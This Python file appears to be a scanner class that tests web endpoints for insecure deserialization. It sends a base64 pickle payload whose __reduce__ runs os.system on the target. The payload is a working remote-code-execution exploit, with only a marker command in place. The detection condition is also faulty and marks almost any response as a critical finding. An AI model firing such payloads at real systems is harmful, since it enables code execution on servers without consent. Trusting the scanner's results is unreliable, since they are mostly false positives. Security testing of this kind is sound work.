import requests
import base64
import pickle
import os  # لازم import هنا عشان يتشاف جوه RCEPayload

class InsecureDeserializationChecker:
    def __init__(self):
        self.findings = []

    def check_insecure_deserialization(self, target_url, param_name="data"):
        print(f"Checking for Insecure Deserialization on {target_url} with parameter {param_name}")
        
        # مثال بسيط لـ Python pickle payload (للتوضيح فقط)
        class RCEPayload:
            def __reduce__(self):
                return (os.system, ("echo PWNED > /tmp/pwned.txt",))

        try:
            # Serialize + encode payload
            serialized_payload = base64.b64encode(pickle.dumps(RCEPayload())).decode()
        except Exception as e:
            print(f"Error creating deserialization payload: {e}")
            return

        test_url = f"{target_url}?{param_name}={serialized_payload}"
        
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 500 or "pickle.UnpicklingError" not in response.text:
                self.findings.append({
                    'vulnerability': 'Insecure Deserialization',
                    'severity': 'Critical',
                    'evidence': f'Potential Insecure Deserialization detected on {target_url} with payload: {serialized_payload}.',
                    'remediation': 'Avoid deserializing untrusted data. Use secure serialization formats and implement integrity checks (e.g., signatures).'
                })
                print(f"Insecure Deserialization detected: {test_url}")
                return
        except requests.exceptions.RequestException as e:
            print(f"Error checking Insecure Deserialization on {target_url}: {e}")

        print("Insecure Deserialization scan complete.")

    def get_findings(self):
        return self.findings
